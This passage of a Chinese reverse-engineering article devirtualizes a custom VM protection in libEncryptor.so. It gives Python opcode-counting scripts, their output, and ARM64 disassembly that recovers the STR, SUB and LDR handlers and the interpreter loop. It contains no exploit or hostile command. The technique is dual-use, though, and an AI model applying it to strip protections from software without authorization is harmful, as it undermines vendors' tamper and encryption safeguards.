struct.unpack(<span style="color: rgb(168, 255, 96);">"&lt;I"</span>, bytes_code[pc : pc + <span style="color: rgb(255, 115, 253);">4</span>])  <br />    <span style="color: rgb(150, 203, 254);">if</span> len(word) &gt; <span style="color: rgb(255, 115, 253);">0</span>:<br />        opcode = word[<span style="color: rgb(255, 115, 253);">0</span>]<br />        op1 = opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span><br />        <span style="color: rgb(150, 203, 254);">if</span> insts_sets.get(op1, <span style="color: rgb(198, 197, 254);">None</span>) == <span style="color: rgb(198, 197, 254);">None</span>:<br />             insts_sets[op1] = <span style="color: rgb(255, 115, 253);">1</span><br />        <span style="color: rgb(150, 203, 254);">else</span>:<br />             insts_sets[op1] += <span style="color: rgb(255, 115, 253);">1</span><br />sorted_dict = dict(sorted(insts_sets.items(), key=<span style="color: rgb(150, 203, 254);">lambda</span> item: item[<span style="color: rgb(255, 115, 253);">1</span>], reverse=<span style="color: rgb(198, 197, 254);">True</span>))<br /><span style="color: rgb(150, 203, 254);">for</span> inst, count <span style="color: rgb(150, 203, 254);">in</span> sorted_dict.items():<br />     print(<span style="color: rgb(168, 255, 96);">f'op1: <span style="color: rgb(218, 239, 163);">{inst}</span>, count: <span style="color: rgb(218, 239, 163);">{count}</span>'</span>)</code></pre><p>得到执行次数最多的指令：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;">op1: 23, count: 56op1: 11, count: 51op1: 40, count: 38op1: 21, count: 27op1: 24, count: 2op1: 12, count: 2op1: 17, count: 2op1: 48, count: 2op1: 52, count: 1<br />op1: 7, count: 1</code></pre><p>从python打印的结果来看23、11、40前面三个指令使用最为频繁，因篇幅关系只分析这三条指令，其中op1值是11的还存在第二个操作码op2，这里选择op1=11 &amp; op2=12的指令进行分析。</p><h3>op1: 23</h3><ul><li style="margin-left: 2px;"><p>取指在循环的开始，首先判断一个虚拟机状态控制码，指示了当前指令执行完成是否进入某些分支跳转指令流程，接着取出4个字节并判断指令op1的合法性，如果不合法忽略当前指令直接跳转B.HI next_pc执行一条指令。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=0edcc450&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3kG9Wbcf5G0jrPiaibnIzS6gIoHraMpVHTUyGRrm6GM96OrRxhePHLnKA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1055" /></li><li style="margin-left: 2px;"><p>解码同样首次解码出四个寄存器操作数，w8=目标操作数Xt，w9=第一源操作数Xn，w10=第二个源操作数Xm，w11=第三个源操作数Xa。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=7e4ece3a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3AK45C2rKTb3WwojoLOqPXwkicibvuhomIGqic8JjaoPeicMtURbqgSriauQ%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></li><li style="margin-left: 2px;"><p>分发 &amp; 解码2既然op1=23，那么switch会跳转到主分发表的case 23的位置，从图中看出20，23，27，35，36，48，54，58多个case合并的到一个的case，可能是这些的代码是相同的被合并到一个地方了。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=0390f6af&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3TXvJTpoTRTtKPlHmLE9VpRWyP4OjllPN3GTIMhyG6Zac7npYH5Vic9Q%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><p><br /><code style="font-family: SFMono-Regular, Consolas, ;">2E50</code>: 代码开头4行代码是判断op1的范围是否20-58之间来确定case的合法性，代码中使用了首次解码的寄存器w10并被直接重新赋值使用了，首次解码时是第二个源寄存器Xm，说明此条指令可能没有第二和第三个源寄存器。<br /><code style="font-family: SFMono-Regular, Consolas, ;">2E60-2E8C</code>: 首次解码的寄存器w11是第三个源寄存器，同样被重新赋值给予新的含义了，此时有效的寄存器有w12(opcode)、w8(Xt)、w9(Xn)、x21(pContext上下文指针)，这段代码主要是做了三件事：</p></li><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>获取Imm16:<br />获取一个16位的立即数：w11 = w12[12-15] | w12[31-&gt;11] | w12[30-&gt;10] | w12[29-&gt;9] | w12[28-&gt;8] | w12[27-&gt;7] | w12[26-&gt;6] | w12[6-11-&gt;0-5]，解码过程的高级语言版本方便理解 (opcode &amp; 0xF000) |  (opcode &gt;&gt; 20 &amp; 0xFC0) | (opcode &gt;&gt; 6 &amp; 0x3F)</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E60</span> <span style="color: rgb(255, 115, 253);">060</span>                 UBFX            W11, W12, <span style="color: rgb(146, 255, 184);">#6, #6 ; w12[6-11-&gt;0-5]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E64</span> <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">AND</span>             W12, W12, <span style="color: rgb(146, 255, 184);">#0xF000 ; w12[12-15]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E68</span> <span style="color: rgb(255, 115, 253);">060</span>                 BFXIL           W12, W18, <span style="color: rgb(146, 255, 184);">#20, #12 ; w12[12-15] | w12[26-&gt;6]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E6</span>C <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W12, W11 <span style="color: rgb(146, 255, 184);">; w12[12-15] | w12[26-&gt;6] | w12[6-11-&gt;0-5]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E78</span> <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W17,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[27-&gt;7]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E80</span> <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W16,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[28-&gt;8]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E84</span> <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W15,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[29-&gt;9]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E88</span> <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W14,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[30-&gt;10]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E8</span>C <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W13,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[31-&gt;11]</span></code></pre></li><li style="margin-left: 2px;"><p>获取源操作数Xn的值：<br /><code style="font-family: SFMono-Regular, Consolas, ;">2E70</code>：x21是pContext指针，w9是第一个源寄存器是一个偏移索引值，x9 = x21 + w9 <em style="color: rgb(102, 102, 102);">8得到相对的偏移植。<br /><code style="font-family: Consolas, Monaco, ;">2E7C</code>:  从上下文中取出第一个寄存器的值，x9 = x21 + w9 </em>8 + 8。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E70</span> <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">ADD</span>             X9, X21, W9,UXTW<span style="color: rgb(146, 255, 184);">#3</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002E7</span>C <span style="color: rgb(255, 115, 253);">060</span>                 LDR             X9, [X9,<span style="color: rgb(146, 255, 184);">#8]</span></code></pre></li><li style="margin-left: 2px;"><p>计算出一个偏移量：<br />第一个寄存器的值加上imm16扩展到32位的立即数得到一个偏移量。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 115, 253);">2</span>E94 <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">ADD</span>             X9, X9, W11,<span style="color: rgb(150, 203, 254);">SXTH</span> <span style="color: rgb(146, 255, 184);">; w9=address,取出半字16立即数再相加</span></code></pre></li></ol><li style="margin-left: 2px;"><p>执行再次分发后来到case 23的最终目标地：<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=e82535a2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3BRWNB9oiaEevsOgHzXXzuRexV8OfhE8K7jLFpjz8iahoHLh3IdhsDggg%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1066" /><p>x9：此时是一个偏移量w8：是一个目标寄存器，它的值是一个索引值<br /><code style="font-family: SFMono-Regular, Consolas, ;">3380</code>:  x21是pContext指针，w8是目标源寄存器是一个偏移索引值，x9 = x21 + w9 <em style="color: rgb(102, 102, 102);">8得到相对的偏移植。<br /><code style="font-family: Consolas, Monaco, ;">3384</code>: 取出目标寄存器的值，x8 = x21 + w8 </em>8 + 8。<br /><code style="font-family: SFMono-Regular, Consolas, ;">3388</code>: 将目标寄存器存储到偏移量地址中，[Xn + imm]=Xt。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000003380</span>     case_23__STR_Xt_Mem_Xn_simm<br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000003380</span> <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">ADD</span>             X8, X21, W8,UXTW<span style="color: rgb(146, 255, 184);">#3 ; jumptable 0000000000002E98 case 23</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000003384</span> <span style="color: rgb(255, 115, 253);">060</span>                 LDR             X8, [X8,<span style="color: rgb(146, 255, 184);">#8]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000003388</span> <span style="color: rgb(255, 115, 253);">060</span>                 STR             X8, [X9]</code></pre><p style="margin-bottom: 15px;">准备下一条指令: pc指针地址加4</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 115, 253);">338</span>C <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">B</span>               next_pc</code></pre></li><li style="margin-left: 2px;"><p>指令还原储存指令：STR    Xt, [Xn + imm16]<br />当imm为0时: STR    Xt, [Xn]</p></li></ul><h3>op1: 11 op2: 8</h3><p>当op1值等于11时会解码第二个或第三个操作码。</p><ul><li style="margin-left: 2px;"><p>取指<br />这里不再重复参考op: 23取指部分</p></li><li style="margin-left: 2px;"><p>解码<br />这里不再重复参考op: 23解码部分</p></li><li style="margin-left: 2px;"><p>分发 &amp; 解码211号case首先会提取出op2对op2进行再次switch case分发处理。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=1c334c0a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3mMkVvjXdDPS0oIKAzIlTJnlqnqpKGyzX2Zfyfyh9Rbib7em5wMW1R2g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><p>经过分发跳转跳转来到这里，op2的多个case 1,6,8,12,17,26,36,58也被合并到一个位置。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=be6de0a3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3pIxYhLzMS4e7peLaRBTph6xDicN8lJIQCH14p3FJPatLicAnCDq2hcibQ%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><p>经过多次跳转来吧op2=8的最终目的地case 8，上文提到过op2与op1的操作数位置不一样，Xn(w10)，Xn(w8)，Xm(w9)<br /><code style="font-family: SFMono-Regular, Consolas, ;">3D60</code>: 获取上下文中的寄存器偏移<br /><code style="font-family: SFMono-Regular, Consolas, ;">3D64</code>：取第二次源操作数值，x9=[x11+ w9 <em style="color: rgb(102, 102, 102);">8]<br /><code style="font-family: Consolas, Monaco, ;">3D68</code>：取第一次源操作数值，x8=[x11+ w8 </em>8]<br /><code style="font-family: SFMono-Regular, Consolas, ;">3D6C</code>：减法运算<br /><code style="font-family: SFMono-Regular, Consolas, ;">3D70</code>：将结果写入到目标寄存器，[x11+ w10 * 8] = x8<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=7beaea68&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3wNib7uAZSJFcmxqTQh8iayPtgQNIMSJrucdiceTlwvpWwjibhDpnEYKm3Q%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="851" /></li><li style="margin-left: 2px;"><p>指令还原<br />SUB    Xt, Xn, Xm</p></li></ul><h3>op1: 40</h3><ul><li style="margin-left: 2px;"><p>取指<br />这里不再重复参考op: 23取指部分</p></li><li style="margin-left: 2px;"><p>解码<br />这里不再重复参考op: 23解码部分</p></li><li style="margin-left: 2px;"><p>分发 &amp; 解码2在指令的开头3条指令中第二个(w10)、第三个源寄存器(w11)的值被重新赋值并使用，说明指令中有效寄存器操作数只有Xt和Xn。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d33f7989&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3OKGoCtaUTgVjL7T6LIchZBicjKznvicrHhmyod1PiapyaY3micTOefibT7A%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><p><br />经过分析二次解码和op: 23一模一样，获取立即数、获取源操作数的值、获取一个偏移值</p></li><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>获取immopcode提取imm16位立即数:<br />w11 = w12[12-15] | w12[31-&gt;11] | w12[30-&gt;10] | w12[29-&gt;9] | w12[28-&gt;8] | w12[27-&gt;7] | w12[26-&gt;6] | w12[6-11-&gt;0-5]</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D50 <span style="color: rgb(255, 115, 253);">060</span>                 UBFX            W11, W12, <span style="color: rgb(146, 255, 184);">#6, #6 ; w12[6-11-&gt;0-5]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D54 <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">AND</span>             W12, W12, <span style="color: rgb(146, 255, 184);">#0xF000 ; w12[12-15]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D58 <span style="color: rgb(255, 115, 253);">060</span>                 BFXIL           W12, W18, <span style="color: rgb(146, 255, 184);">#20, #12 ; w12[12-15] | w12[26-&gt;6]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D5C <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W12, W11 <span style="color: rgb(146, 255, 184);">; w12[12-15] | w12[28-&gt;6] | w12[6-11-&gt;0-5]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D68 <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W17,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[27-&gt;7]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D70 <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W16,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[28-&gt;8]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D74 <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W15,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[29-&gt;9]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D78 <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W14,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ; w12[30-&gt;10]</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D7C <span style="color: rgb(255, 115, 253);">060</span>                 ORR             W11, W11, W13,<span style="color: rgb(150, 203, 254);">LSR</span><span style="color: rgb(146, 255, 184);">#20 ;</span></code></pre></li><li style="margin-left: 2px;"><p>获取源操作数的值</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D60 <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">ADD</span>             X9, X21, W9,UXTW<span style="color: rgb(146, 255, 184);">#3</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D6C <span style="color: rgb(255, 115, 253);">060</span>                 LDR             X9, [X9,<span style="color: rgb(146, 255, 184);">#8] ; &lt;&lt; Xn</span></code></pre></li><li style="margin-left: 2px;"><p>计算一个偏移量</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000002</span>D84 <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">ADD</span>             X9, X9, W11,<span style="color: rgb(150, 203, 254);">SXTH</span> <span style="color: rgb(146, 255, 184);">; X9 = Xn + imm16</span></code></pre></li></ol><li style="margin-left: 2px;"><p>执行经过二次解码分析得出目前有效的真实寄存器有：x9是源寄存器加上立即的一个偏移量，w8是目标操作数索引值。<br /><code style="font-family: SFMono-Regular, Consolas, ;">3318</code>：偏移量的内存中取值<br /><code style="font-family: SFMono-Regular, Consolas, ;">3A70</code>：计算目标寄存器在pContext的偏移地址，x8= x21 + w8 * 8<br /><code style="font-family: SFMono-Regular, Consolas, ;">3A74</code>：将内存值放入目标寄存器</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000003318</span> <span style="color: rgb(255, 115, 253);">060</span>                 LDR             X9, [X9] <br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000003</span>A70 <span style="color: rgb(255, 115, 253);">060</span>                 <span style="color: rgb(150, 203, 254);">ADD</span>             X8, X21, W8,UXTW<span style="color: rgb(146, 255, 184);">#3</span><br /><span style="color: rgb(198, 197, 254);">.text:</span><span style="color: rgb(255, 115, 253);">0000000000003</span>A74 <span style="color: rgb(255, 115, 253);">060</span>                 STR             X9, [X8,<span style="color: rgb(146, 255, 184);">#8]</span></code></pre></li><li style="margin-left: 2px;"><p>指令还原加载指令：LDR    Xt, [Xn + imm16]<br />当imm为0时：LDR    Xt, [Xn]</p></li></ul><h2>虚拟机执行框架</h2><p>分析完取指、解码、执行后大体得到了一个模糊的虚拟机执行框架，为了方便记忆和理解使用c伪代码来描述。<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=71fd81c8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B36eb43kBiaeRwZEjJv0sDnhSYd88gkCj2EctRT8UqMibPNI4zTLKoKvKA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1060" /></p><p><br /></p><h2>解码op1 &amp; op2</h2><p>使用脚本解析opcode的op1和op2打印所有需要分析的handler。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;">            <span style="color: rgb(150, 203, 254);">import</span> struct<br />            pcode_start = <span style="color: rgb(255, 115, 253);">0xB090</span><br />            pcode_size = <span style="color: rgb(255, 115, 253);">0x2D8</span><br />            <span style="color: rgb(150, 203, 254);">with</span> open(<span style="color: rgb(168, 255, 96);">"libEncryptor.so"</span>, <span style="color: rgb(168, 255, 96);">"rb"</span>) <span style="color: rgb(150, 203, 254);">as</span> f:                            content = f.read()            bytes_code = content[pcode_start : pcode_start + pcode_size]            insts_op1_sets = {}            insts_op2_sets = {}<br />            <span style="color: rgb(150, 203, 254);">for</span> pc <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0</span>, pcode_size, <span style="color: rgb(255, 115, 253);">4</span>):<br />                    word = struct.unpack(<span style="color: rgb(168, 255, 96);">"&lt;I"</span>, bytes_code[pc : pc + <span style="color: rgb(255, 115, 253);">4</span>])  <br />                    <span style="color: rgb(150, 203, 254);">if</span> len(word) &gt; <span style="color: rgb(255, 115, 253);">0</span>:<br />                            opcode = word[<span style="color: rgb(255, 115, 253);">0</span>]<br />                            op1 = opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span><br />                            <span style="color: rgb(150, 203, 254);">if</span> op1 == <span style="color: rgb(255, 115, 253);">11</span>:<br />                                    op2 = (opcode &gt;&gt; <span style="color: rgb(255, 115, 253);">6</span>) &amp; <span style="color: rgb(255, 115, 253);">0x3F</span><br />                                    <span style="color: rgb(150, 203, 254);">if</span> insts_op2_sets.get(op2, <span style="color: rgb(198, 197, 254);">None</span>) == <span style="color: rgb(198, 197, 254);">None</span>:<br />                                            insts_op2_sets[op2] = <span style="color: rgb(255, 115, 253);">1</span><br />                                    <span style="color: rgb(150, 203, 254);">else</span>:<br />                                            insts_op2_sets[op2] += <span style="color: rgb(255, 115, 253);">1</span><br />                            <span style="color: rgb(150, 203, 254);">else</span>:<br />                                    <span style="color: rgb(150, 203, 254);">if</span> insts_op1_sets.get(op1, <span style="color: rgb(198, 197, 254);">None</span>) == <span style="color: rgb(198, 197, 254);">None</span>:<br />                                            insts_op1_sets[op1] = <span style="color: rgb(255, 115, 253);">1</span><br />                                    <span style="color: rgb(150, 203, 254);">else</span>:<br />                                            insts_op1_sets[op1] += <span style="color: rgb(255, 115, 253);">1</span><br />            print(<span style="color: rgb(168, 255, 96);">"op1指令统计:"</span>)<br />            op1_sorted_dict = dict(sorted(insts_op1_sets.items(), key=<span style="color: rgb(150, 203, 254);">lambda</span> item: item[<span style="color: rgb(255, 115, 253);">1</span>], reverse=<span style="color: rgb(198, 197, 254);">True</span>))<br />            <span style="color: rgb(150, 203, 254);">for</span> inst, count <span style="color: rgb(150, 203, 254);">in</span> op1_sorted_dict.items():<br />                     print(<span style="color: rgb(168, 255, 96);">f'op1: <span style="color: rgb(218, 239, 163);">{inst}</span>, count: <span style="color: rgb(218, 239, 163);">{count}</span>'</span>)<br />            print(<span style="color: rgb(168, 255, 96);">"op2指令统计:"</span>)<br />            op2_sorted_dict = dict(sorted(insts_op2_sets.items(), key=<span style="color: rgb(150, 203, 254);">lambda</span> item: item[<span style="color: rgb(255, 115, 253);">1</span>], reverse=<span style="color: rgb(198, 197, 254);">True</span>))<br />            <span style="color: rgb(150, 203, 254);">for</span> inst, count <span style="color: rgb(150, 203, 254);">in</span> op2_sorted_dict.items():<br />                     print(<span style="color: rgb(168, 255, 96);">f'op1: 11, op2: <span style="color: rgb(218, 239, 163);">{inst}</span>, count: <span style="color: rgb(218, 239, 163);">{count}</span>'</span>)</code></pre><p>一共打印出15个handler，好在需要分析还原的指令不多：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">op1指令统计:</span><br />op1: <span style="color: rgb(255, 115, 253);">23</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">56</span><br />op1: <span style="color: rgb(255, 115, 253);">40</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">38</span><br />op1: <span style="color: rgb(255, 115, 253);">21</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">27</span><br />op1: <span style="color: rgb(255, 115, 253);">24</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">2</span><br />op1: <span style="color: rgb(255, 115, 253);">12</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">2</span><br />op1: <span style="color: rgb(255, 115, 253);">17</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">2</span><br />op1: <span style="color: rgb(255, 115, 253);">48</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">2</span><br />op1: <span style="color: rgb(255, 115, 253);">52</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">1</span><br />op1: <span style="color: rgb(255, 115, 253);">7</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">1</span><br /><span style="color: rgb(168, 255, 96);">op2指令统计:</span><br />op1: <span style="color: rgb(255, 115, 253);">11</span><span style="color: rgb(168, 255, 96);">,</span> op2: <span style="color: rgb(255, 115, 253);">7</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">25</span><br />op1: <span style="color: rgb(255, 115, 253);">11</span><span style="color: rgb(168, 255, 96);">,</span> op2: <span style="color: rgb(255, 115, 253);">43</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">14</span><br />op1: <span style="color: rgb(255, 115, 253);">11</span><span style="color: rgb(168, 255, 96);">,</span> op2: <span style="color: 